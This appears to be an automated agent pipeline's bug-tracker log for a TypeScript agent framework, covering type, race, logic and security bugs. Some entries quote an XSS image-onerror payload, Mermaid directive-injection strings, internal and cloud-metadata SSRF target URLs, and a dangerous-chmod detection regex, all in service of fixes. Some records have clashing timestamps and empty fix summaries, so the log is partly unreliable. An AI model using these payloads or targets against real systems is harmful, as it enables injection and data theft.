- **file:** `src/tools/define.ts`
- **line:** `45`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0381`
- **description:** `executeTool(tool, call.args)` passes `Record<string, unknown>` to a generic `executeTool<TInput>` where `TInput` resolves to `any` via the `ToolDefinition` default, erasing compile-time input type validation.
- **context:** The concrete `TInput` of each registered tool is lost when stored in `ToolDefinition[]` using the `any` default generic, so `call.args` is passed unchecked into `tool.execute` — schema mismatches between the LLM-supplied args and the tool's expected input are not caught at compile time.
- **hunter_found:** `2026-03-20T22:25:00Z`
- **fixer_started:** `2026-03-21T06:05:00Z`
- **fixer_completed:** `2026-03-21T06:05:00Z`
- **fix_summary:** `Added runtime args validation via validateToolArgs before executeTool call in define.ts.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0383
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/swarm/snapshot.ts`
- **line:** `98`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0383`
- **description:** The cap check `this.snapshots.size > MAX_SNAPSHOTS` (strict greater-than) allows the map to transiently hold MAX_SNAPSHOTS + 1 entries before eviction, violating the intended bound.
- **context:** One extra snapshot is stored on each capture() call that crosses the boundary; under high-frequency captures the map can contain 101 entries momentarily, slightly exceeding the memory budget.
- **hunter_found:** `2026-03-20T22:25:00Z`
- **fixer_started:** `2026-03-21T06:25:00Z`
- **fixer_completed:** `2026-03-21T06:25:00Z`
- **fix_summary:** `Change > to >= in snapshot cap check to prevent transient overflow.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0384
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/pregel/checkpointing.ts`
- **line:** `85`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0384`
- **description:** `forkFrom()` fallback path copies checkpoints with `step <= targetStep` to `newThreadId` but never clears pre-existing checkpoints on `newThreadId`, producing a corrupted mixed timeline if the thread already has history.
- **context:** `checkpointer.get(newThreadId)` returns the highest-step checkpoint, which may belong to the thread's prior contents rather than the intended fork point, causing getState and getStateAt to return stale or wrong state after a fork.
- **hunter_found:** `2026-03-20T22:25:00Z`
- **fixer_started:** `2026-03-21T06:05:00Z`
- **fixer_completed:** `2026-03-21T06:05:00Z`
- **fix_summary:** `Added delete(newThreadId) before copy loop in forkFrom() and PersistentCheckpointer.fork().`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---


### BUG-0385
- **status:** `blocked`
- **severity:** `medium`
- **file:** `packages/integrations/src/adapter/auth-resolver.ts`
- **line:** `47`
- **category:** `dead-code`
- **reopen_count:** `0`
- **branch:** ``
- **description:** The `options.scope` parameter in `storeAuthResolver` is accepted and triggers a warning when absent, but its value is never used in any access-control logic — the credential lookup behaves identically with or without a scope.
- **context:** The "restricted access" promise implied by the warning is dead — no scoping is applied, making the parameter a no-op that misleads callers into thinking credential access is restricted.
- **hunter_found:** `2026-03-20T22:30:00Z`
- **fixer_started:** `2026-03-21T05:55:00Z`
- **fixer_completed:** ``
- **fix_summary:** `False positive. No options.scope parameter or scope warning exists in auth-resolver.ts. Code described in bug is absent.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0386
- **status:** `fixed`
- **severity:** `high`
- **file:** `packages/integrations/src/adapter/auth-resolver.ts`
- **line:** `55`
- **category:** `other`
- **reopen_count:** `1`
- **branch:** `bugfix/BUG-0386`
- **description:** `storeAuthResolver` returns a `resolve` function with zero parameters that violates the `AuthResolver` interface which declares `resolve(authDef: unknown, ctx: unknown): Promise<unknown>`.
- **context:** The `ctx` parameter — intended to carry per-request scoping information such as user ID or tenant — is silently discarded; callers passing `ctx` for credential scoping will get back the wrong (shared) credential without any error.
- **hunter_found:** `2026-03-20T22:30:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** `2026-03-21T05:08:34Z`
- **validator_completed:** `2026-03-21T05:23:12Z`
- **validator_notes:** `REOPENED: Signature updated for type conformance (tsc passes), but both params are _authDef/_ctx (underscore-prefixed unused). ctx is never used for credential scoping — store.get() still uses only static integrationKey. The behavioral bug (shared credentials regardless of ctx) persists. Also removed options?.scope warning guard without replacement. Fixer must: actually use ctx parameter in the store.get() call for per-request credential scoping, or at minimum include ctx in the cache key.`

---

### BUG-0387
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/index.ts`
- **line:** `11`
- **category:** `other`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0387`
- **description:** `RedisCheckpointer` is exported from `src/checkpointers/index.ts` but omitted from the public re-export in `src/index.ts`, making it inaccessible from the package's public API.
- **context:** Consumers importing from `@oni.bot/core` cannot access `RedisCheckpointer` despite it being a first-class production checkpointer — they must reach into the internal path instead.
- **hunter_found:** `2026-03-20T22:30:00Z`
- **fixer_started:** `2026-03-21T06:05:00Z`
- **fixer_completed:** `2026-03-21T06:05:00Z`
- **fix_summary:** `Added RedisCheckpointer to public API re-exports in src/index.ts.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0388
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/stream-events.ts`
- **line:** `36`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0388`
- **description:** `finalData` is initialized to `undefined` and only set in the `state_update` branch — if no `state_update` event is emitted, the closing `on_chain_end` event silently reports `undefined` as output.
- **context:** The `streamEvents` wrapper relies solely on `state_update` to populate `finalData`; if pregel completes without emitting that event type, the final event yields no output, making downstream consumers believe the chain produced nothing.
- **hunter_found:** `2026-03-20T22:30:00Z`
- **fixer_started:** `2026-03-21T06:25:00Z`
- **fixer_completed:** `2026-03-21T06:25:00Z`
- **fix_summary:** `Fall back to node_end data then {} when no state_update emitted.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0389
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/testing/index.ts`
- **line:** `128`
- **category:** `dead-code`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0389`
- **description:** `invocationCount` closure variable is incremented on every call but never read for any assertion, return value, or observable behavior — it is write-only dead state.
- **context:** The variable was likely intended to expose call-count telemetry to test authors, but the `TestHarness` interface has no `invocationCount` property and the value is never returned or accessible.
- **hunter_found:** `2026-03-20T22:30:00Z`
- **fixer_started:** `2026-03-21T06:25:00Z`
- **fixer_completed:** `2026-03-21T06:25:00Z`
- **fix_summary:** `Remove write-only invocationCount dead code from testing harness.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0390
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/checkpointers/namespaced.ts`
- **line:** `17`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0390`
- **description:** The `prefix` helper computes the namespaced key as `${threadId}:${ns}` (namespace is a suffix), but callers expecting the namespace as the leading segment for key-space isolation get inverted key ordering.
- **context:** If Redis or other prefix-scan-based stores use this key format to enumerate all checkpoints under a namespace, the inverted order breaks that enumeration pattern — scans for `ns:*` will miss all keys.
- **hunter_found:** `2026-03-20T22:30:00Z`
- **fixer_started:** `2026-03-21T06:25:00Z`
- **fixer_completed:** `2026-03-21T06:25:00Z`
- **fix_summary:** `Swap namespace to leading segment in checkpointer key prefix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0392
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/mermaid.ts`
- **line:** `45`
- **category:** `security-xss`
- **description:** `toSwarmMermaid()` embeds `entry.role` and capability names in Mermaid HTML labels (`<b>${entry.role}</b>`, `<i>${caps}</i>`) without escaping `<`, `>`, `&`, or newline characters, enabling Mermaid directive injection and potential XSS when the diagram is rendered in a web UI.
- **context:** Line 60 escapes `"`, `[`, `]` but NOT angle brackets or newlines. A role containing `</b><img src=x onerror=alert(1)>` injects arbitrary HTML into the Mermaid label since Mermaid renders HTML in node labels. A role containing a newline breaks Mermaid syntax, allowing injection of arbitrary directives (e.g., `click` handlers). Compare with `inspect.ts:189` which correctly strips `<>` and newlines via its `sanitize()` helper, and BUG-0294 which covers the same class of issue in `graph.ts`. Fix: escape `<`, `>`, `&`, newlines, and `|` in role and capability strings before interpolation. OWASP A03:2021 - Injection.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0392`
- **hunter_found:** `2026-03-23T12:30:00Z`
- **fixer_started:** `2026-03-21T06:15:00Z`
- **fixer_completed:** `2026-03-21T06:15:00Z`
- **fix_summary:** `Escape HTML, newlines, and pipe in Mermaid role and capability labels.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---
### BUG-0393
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/tracer.ts`
- **line:** `112`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0393`
- **description:** `record()` performs a non-atomic push+splice on `this.events` — concurrent callers can both observe `length > maxEvents` and double-splice, losing more events than intended.
- **context:** Under high-concurrency swarm runs where many agents fire `record()` near-simultaneously, the event timeline can lose entries beyond the intended cap, corrupting metrics and timeline queries.
- **hunter_found:** `2026-03-20T22:45:00Z`
- **fixer_started:** `2026-03-21T06:50:00Z`
- **fixer_completed:** `2026-03-21T06:50:00Z`
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/swarm/tracer-event-trim.test.ts`

---

### BUG-0394
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/tracer.ts`
- **line:** `221`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0393`
- **description:** `clear()` replaces `this.events` with a new array non-atomically — a concurrent `record()` call holding a reference to the old array via `this.events.push` will write to the discarded array, silently losing the event.
- **context:** An agent completing while `clear()` runs will have its event written to the old array and discarded, making the fresh timeline miss legitimate events.
- **hunter_found:** `2026-03-20T22:45:00Z`
- **fixer_started:** `2026-03-21T06:50:00Z`
- **fixer_completed:** `2026-03-21T06:50:00Z`
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/swarm/tracer-event-trim.test.ts`

---

### BUG-0396
- **status:** `blocked`
- **severity:** `high`
- **file:** `src/swarm/pool.ts`
- **line:** `269`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** ``
- **description:** The `onError` hook call is not wrapped in try/catch, unlike `onStart` (line 235) and `onComplete` (line 251) which both have guarded try/catch blocks — a throwing `onError` hook replaces the original agent error.
- **context:** A buggy `onError` hook silently swallows the real failure reason and propagates its own exception, making debugging and upstream error-handling logic unreliable.
- **hunter_found:** `2026-03-20T22:45:00Z`
- **fixer_started:** `2026-03-21T06:35:00Z`
- **fixer_completed:** ``
- **fix_summary:** `Duplicate of BUG-0306 (same file, same line, same issue). BUG-0306 already fixed and verified.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0397
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/harness.ts`
- **line:** `183`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0397`
- **description:** `runToResult` throws when an `error` message arrives after a `result` message because it checks `errorMsg !== undefined` without gating on whether a result was already received — a valid result is discarded.
- **context:** An agent run that emits a result followed by an error event (e.g., from a cleanup hook) will throw instead of returning the successful outcome, causing callers to incorrectly see a failure.
- **hunter_found:** `2026-03-20T22:45:00Z`
- **fixer_started:** `2026-03-21T06:35:00Z`
- **fixer_completed:** `2026-03-21T06:35:00Z`
- **fix_summary:** `Gate error throw on no result already received in runToResult. Late errors after valid result are ignored.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0398
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/cli/test.ts`
- **line:** `13`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0398`
- **description:** In watch mode, vitest is called with no subcommand instead of explicit `--watch`, causing it to hang in CI (non-TTY) environments waiting for input.
- **context:** The code path for watch mode relies on vitest TTY detection rather than explicitly passing `--watch`, which fails in non-interactive terminals.
- **hunter_found:** `2026-03-20T22:45:00Z`
- **fixer_started:** `2026-03-21T06:50:00Z`
- **fixer_completed:** `2026-03-21T06:50:00Z`
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0400
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/tools/src/browser/firecrawl.ts`
- **line:** `40`
- **category:** `security-config`
- **description:** `firecrawl_scrape` tool passes LLM-supplied URLs to the Firecrawl API without validating the URL scheme or host, enabling indirect SSRF via Firecrawl's scraping infrastructure.
- **context:** The `i.url` parameter from LLM tool calls is sent directly to `https://api.firecrawl.dev/v0/scrape` at line 40 with no validation. A prompt-injected LLM can supply URLs targeting internal networks (`http://169.254.169.254/latest/meta-data/`, `http://localhost:8080/admin`, `http://10.0.0.1/`) which Firecrawl's servers will attempt to fetch. While the request is proxied through Firecrawl (not made from the agent's host), cloud scraping services may not block all internal IP ranges, and the scraped content is returned to the LLM context, potentially leaking sensitive metadata. Fix: validate URL scheme (https/http only) and reject private/reserved IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, ::1) before sending to the API. OWASP A10:2021 - Server-Side Request Forgery.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0400`
- **hunter_found:** `2026-03-23T14:10:00Z`
- **fixer_started:** `2026-03-21T06:50:00Z`
- **fixer_completed:** `2026-03-21T06:50:00Z`
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---
<!-- HUNTER: Append new bugs above this line -->

### BUG-0294
- **status:** `blocked`
- **severity:** `medium`
- **file:** `src/graph.ts`
- **line:** `216`
- **category:** `security-injection`
- **description:** `StateGraph.toMermaid()` embeds raw node names into Mermaid markup via `lbl(n as string)` without sanitization, enabling Mermaid injection via crafted node names containing newlines and embedded directives.
- **context:** BUG-0292 fix applied `sanitizeMermaid()` to `src/swarm/compile-ext.ts` but missed `StateGraph.toMermaid()` in `src/graph.ts`. The `lbl()` helper at line 218-219 casts node names directly to string with no escaping. A crafted node name such as `"node\nstyle node fill:#ff0000\ninjected_directive"` or `'node\nclick node call alert("XSS")'` injects arbitrary Mermaid directives into the output. Since Mermaid diagrams are rendered in web UIs, this can enable XSS in environments that render the diagram. Two regression tests in `src/__tests__/mermaid-node-injection.test.ts` confirm this: "BUG-0292: crafted node ID containing newline should not inject Mermaid directives" and "BUG-0292: crafted node ID containing Mermaid click directive should be escaped" both fail. Fix: import `sanitizeMermaid` from `./inspect.js` and apply it in `lbl()` for non-START/non-END nodes. OWASP A03:2021 - Injection.
- **reopen_count:** `3`
- **branch:** `bugfix/BUG-0294`
- **hunter_found:** `2026-03-20T05:23:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** `Auto-blocked after 3 failed fix attempts. Requires human review.`
- **validator_started:** `2026-03-21T04:21:49Z`
- **validator_completed:** `2026-03-21T04:30:00Z`
- **validator_notes:** `REOPENED (3rd time): Fix never applied — toMermaid() in graph.ts and toMermaidDetailed() in inspect.ts still embed raw node names without sanitization. lbl() helper has no sanitize() call. Test file mermaid-node-injection.test.ts still missing. reopen_count now 3 — Fixer should auto-block per guardrail.`

---

### BUG-0295
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/errors.ts`
- **line:** `58`
- **category:** `information-disclosure`
- **description:** `ONIError.toJSON()` and `toInternalJSON()` are identical — both expose `stack` in their output. The method names imply different audiences (external vs internal), but the external-facing `toJSON()` leaks call stack traces, revealing internal file paths and library versions to callers. Any code that serializes an `ONIError` to a client or log sink via `JSON.stringify()` or similar will inadvertently expose stack information. Fix: remove the `stack` field from `toJSON()` so only `toInternalJSON()` includes it. OWASP A05:2021 - Security Misconfiguration.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0295`
- **hunter_found:** `2026-03-20T13:00:00Z`
- **fixer_started:** `2026-03-21T05:22:00Z`
- **fixer_completed:** `2026-03-21T05:22:00Z`
- **fix_summary:** `Removed stack field from ONIError.toJSON(). Stack now only in toInternalJSON() for internal use.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0358
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/hooks-engine.ts`
- **line:** `360`
- **category:** `security-logic`
- **test_generated:** `true`
- **test_file:** `src/__tests__/hooks-bash-bypass-extended.test.ts`
- **description:** The `dangerousBashPatterns` regex `/chmod\s+[0-7]*[4-7][0-7]{2}\s/` at line 360 is overly broad and produces false positives, incorrectly blocking safe permissions like `chmod 755`.
- **context:** The pattern was introduced to catch setuid/setgid octal chmod calls (e.g. `chmod 4755`, `chmod 6755`). However the regex `[4-7][0-7]{2}` matches any octet where the first digit is 4–7, which includes the common and safe `755` (rwxr-xr-x). The test "allows chmod 755 ./script.sh (not 777)" in `hooks-bash-bypass-extended.test.ts` fails with `expected 'deny' not to be 'deny'`. The fix should narrow the pattern to only match chmod modes that actually set a setuid/setgid bit: `/chmod\s+[0-7]?[46][0-7]{2}\b/` (digit 4 = setuid, digit 6 = setuid+setgid). OWASP A01:2021 - Broken Access Control.
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0358`
- **hunter_found:** `2026-03-20T14:51:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Narrowed chmod regex to only match setuid/setgid modes (4xxx, 6xxx). Allows safe 755.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0368
- **status:** `blocked`
- **severity:** `high`
- **file:** `src/__tests__/pregel-nodes-snapshot-regression.test.ts`
- **line:** `54`
- **category:** `test-regression`
- **description:** Test "parallel node execution succeeds when multiple nodes share a superstep" times out (5000ms) — regression since CI Cycle 8 (all-green).
- **context:** CI Sentinel Cycle 9 detected this test hanging on `app.invoke({ results: [] })` in a simple parallel graph (START → branch-a AND branch-b → merge → END). The test was green in the previous cycle (Cycle 8, 2026-03-21T04:11:28Z). No changes to `src/pregel/streaming.ts` have been made since the last green run. Possible cause: deadlock or missing edge completion in the Pregel superstep scheduler when two parallel branches converge on a shared merge node. The `swarm/supervisor-routing-error.test.ts` worker also failed to start in the same run, suggesting potential infra contention, but the timeout is a hard 5s test timeout (not a vitest worker issue).
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T21:30:00Z`
- **fixer_started:** `2026-03-21T05:12:00Z`
- **fixer_completed:** ``
- **fix_summary:** `Not reproducible. All 4 tests in pregel-nodes-snapshot-regression pass on current main. Regression was caused by stale working-tree changes now resolved.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0369
- **status:** `blocked`
- **severity:** `medium`
- **file:** `src/__tests__/swarm/supervisor-routing-error.test.ts`
- **line:** `1`
- **category:** `infrastructure`
- **description:** Vitest pool worker failed to start for `swarm/supervisor-routing-error.test.ts` with "Timeout waiting for worker to respond" — test suite could not execute.
- **context:** CI Sentinel Cycle 9 detected a vitest-pool worker startup failure: `[vitest-pool]: Failed to start forks worker for test files /home/cerebro/projects/oni-core/src/__tests__/swarm/supervisor-routing-error.test.ts. Caused by: Error: [vitest-pool-runner]: Timeout waiting for worker to respond`. The suite itself did not produce test results (0 tests reported). A similar ghost-suite failure was seen in Cycle 7 and resolved itself (stale cache). This may be a transient vitest worker pool exhaustion or deadlock triggered by the `pregel-nodes-snapshot-regression` test hanging for 5s and holding a worker slot. Could self-resolve on retry.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-21T21:30:00Z`
- **fixer_started:** `2026-03-21T05:12:00Z`
- **fixer_completed:** ``
- **fix_summary:** `Transient vitest worker issue triggered by BUG-0368 test hang. BUG-0368 is now resolved. Self-resolving.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0401
- **status:** `blocked`
- **severity:** `low`
- **file:** `src/__tests__/swarm/skill-evolver-esm-path.test.ts`
- **line:** `1`
- **category:** `infrastructure`
- **description:** `skill-evolver-esm-path.test.ts` reports "Cannot find module" and 0 tests during the full parallel `npm test` run, but passes (2/2 tests green) when executed in isolation with `vitest run`.
- **context:** CI Sentinel Cycle 18 detected this as a ghost-suite failure: vitest reports the suite as failed with "Error: Cannot find module '/home/cerebro/projects/oni-core/src/__tests__/swarm/skill-evolver-esm-path.test.ts'" and 0 tests during the full parallel test run. Isolated run via `npx vitest run src/__tests__/swarm/skill-evolver-esm-path.test.ts` passes cleanly (2 passed). This is consistent with prior transient vitest worker pool / module resolution failures observed in BUG-0368 and BUG-0369. The underlying source fix for BUG-0078 was verified and merged to main. Likely a transient worker isolation or import-cache collision in the parallel test runner. Monitor for recurrence.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T22:42:00Z`
- **fixer_started:** `2026-03-21T07:35:00Z`
- **fixer_completed:** ``
- **fix_summary:** `Transient vitest worker pool issue. Test passes in isolation (2/2 green). Same pattern as BUG-0368/BUG-0369. Self-resolving on retry.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0402
- **status:** `blocked`
- **severity:** `medium`
- **file:** `src/__tests__/`
- **line:** `1`
- **category:** `infrastructure`
- **description:** Mass ghost-suite failure during parallel `npm test`: 10+ test files report "Cannot find module" with 0 tests collected, but all pass when run in isolation. Significant escalation of BUG-0401 pattern.
- **context:** CI Sentinel Cycle 19 (2026-03-20T22:51:00Z) detected 10 suites reporting "Cannot find module" during the full parallel `npm test` run: `circuit-breaker-half-open-single-probe.test.ts`, `cli-toplevel-error-handling.test.ts`, `lsp-client-message-validation.test.ts`, `request-reply-atomic-resolved.test.ts`, `harness-loop-env-sanitize.test.ts`, `harness-tools-hook-args-replace.test.ts`, `swarm/experiment-log-trim.test.ts`, `swarm/registry-tomanifest-injection.test.ts`, `swarm/scaling-error-latency-regression.test.ts`, `swarm/spawn-agent-concurrent-snapshot.test.ts`, `swarm/swarmgraph-dispose.test.ts`, `swarm/tracer-event-trim.test.ts`. All files exist on disk and pass (12, 16, 8, 13 tests in isolated batch runs). This is a significant surge from Cycle 18 (1 ghost suite — BUG-0401) to 10+ ghost suites in Cycle 19, with total test count dropping from 1373 to 1328. Root cause is vitest parallel worker pool exhaustion or module resolution cache collision under high concurrency. Human intervention required to investigate vitest pool size, worker isolation settings, or import cache configuration — not self-resolving when this many suites are simultaneously affected.
- **reopen_count:** `0`
- **branch:** ``
- **hunter_found:** `2026-03-20T22:51:00Z`
- **fixer_started:** ``
- **fixer_completed:** ``
- **fix_summary:** ``
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---
